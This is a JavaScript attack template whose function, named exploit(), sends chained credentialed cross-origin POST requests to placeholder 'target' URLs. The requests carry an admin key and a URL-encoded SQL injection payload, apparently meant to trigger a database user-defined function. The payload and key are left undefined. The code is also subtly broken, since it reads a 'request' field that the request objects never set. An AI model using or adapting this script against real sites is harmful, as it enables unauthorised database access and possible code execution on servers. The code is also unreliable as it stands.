async function exploit() {
  requests = [] // all the requests will be stored here executed in sequence

  requests.push(
    {
      url: `http://target/first/request`,
      config: { // set relevant paramenters here
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(trigger_udf_sqli)
      },
    }
  );

  requests.push(
    {
      url: `http://target/second/request`,
      config: { // set relevant paramenters here
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(trigger_udf_sqli)
      },
    }
  );
  // See for scaling fetch with: https://stackoverflow.com/questions/40981040/using-a-fetch-inside-another-fetch-in-javascript

  // and handle errors
  const handleFetch = async (request,config) => {
    const res = await fetch(request,config).catch(console.error);
    return res.text();
  }

  // reduce fetches, receives the response
  // of the previous, log it (and maybe use it as input)
  const reduceFetch = async (acc, curr) => {
    const prev = await acc;
    console.log('previous call:', prev);

    return handleFetch(curr.request, curr.config);
  }

  const pipeFetch = async requests => requests.reduce(reduceFetch, Promise.resolve(''));

  pipeFetch(requests).then(console.log);
}
